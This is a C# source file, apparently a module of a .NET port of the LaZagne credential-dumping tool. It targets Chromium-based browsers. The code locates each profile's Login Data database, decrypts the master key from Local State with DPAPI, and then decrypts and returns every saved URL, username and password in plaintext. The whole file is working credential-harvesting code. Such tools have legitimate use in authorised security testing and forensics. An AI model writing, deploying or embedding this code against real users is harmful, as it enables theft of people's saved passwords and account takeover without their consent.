using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Lazagne.Net.Modules.ChromiumBased
{
    class ChromiumBased : IModule
    {
        static ChromiumBased()
        {
            ModuleHandler.Register(new ChromiumBased());
        }

        public IEnumerable<ApplicationInfo> GetCredentials()
        {

            foreach (Browser browser in Constants.Browsers)
                yield return new ApplicationInfo() { Name = browser.Name, Logins = GetBrowserCredentials(browser).ToList() };
        }

        private IEnumerable<LoginInfo> GetBrowserCredentials(Browser browser)
        {
            IEnumerable<(string path, byte[] key)> databases = GetDatabases(browser);

            foreach ((string path, byte[] key) databaseInfo in databases)
            {
                using TemporaryCopy temp = new TemporaryCopy(databaseInfo.path);
                using Database database = Database.FromFile(temp.TempPath);

                foreach (EncryptedLoginInfo encryptedLogin in database.GetLogins())
                {
                    string password;
                    try
                    {
                        password = Encoding.UTF8.GetString(Crypto.Unprotect(encryptedLogin.EncryptedPassword));
                    }
                    catch (Exception)
                    {
                        try
                        {
                            password = Encoding.UTF8.GetString(Crypto.Decrypt(encryptedLogin.EncryptedPassword, databaseInfo.key));
                        }
                        catch (Exception)
                        {
                            continue;
                        }

                    }

                    yield return new LoginInfo() { Url = encryptedLogin.Url, Login = encryptedLogin.Login, Password = password };
                }

            }
        }

        private List<(string path, byte[] key)> GetDatabases(Browser browser)
        {
            string userData = browser.Path
                .Replace("{LOCALAPPDATA}", Environment.GetEnvironmentVariable("LocalAppData"))
                .Replace("{APPDATA}", Environment.GetEnvironmentVariable("AppData"));


            string profilePath = Path.Join(userData, "Local State");

            List<(string path, byte[] key)> databases = new List<(string path, byte[] key)>();

            if (!File.Exists(profilePath))
                return databases;

            List<string> profiles = new List<string>() { "Default", "" };

            foreach (string dir in Directory.GetDirectories(userData).Select(path => Path.GetFileName(path)))
            {
                if (dir.StartsWith("Profile"))
                    profiles.Add(dir);
            }

            JObject state;
            using (StreamReader reader = File.OpenText(profilePath))
                state = (JObject)JToken.ReadFrom(new JsonTextReader(reader));
            if (state["profile"] != null)
            {
                foreach (string profile in (state["profile"]["info_cache"] as JObject).Properties().Select(p => p.Name))
                {
                    if (!profiles.Contains(profile))
                        profiles.Add(profile);
                }
            }

            byte[] encryptedKey = (byte[])state["os_crypt"]["encrypted_key"];
            byte[] key = Crypto.Unprotect(encryptedKey[5..]);


            foreach (string profile in profiles)
            {
                string[] files;
                try
                {
                    files = Directory.GetFiles(Path.Join(userData, profile));
                }
                catch (Exception)
                {
                    continue;
                }

                foreach (string path in files)
                {
                    if (Path.GetFileName(path).ToLower().Contains("login data") && !Path.GetFileName(path).ToLower().Contains("journal"))
                        databases.Add((path, key));
                }
            }

            return databases;
        }
    }
}
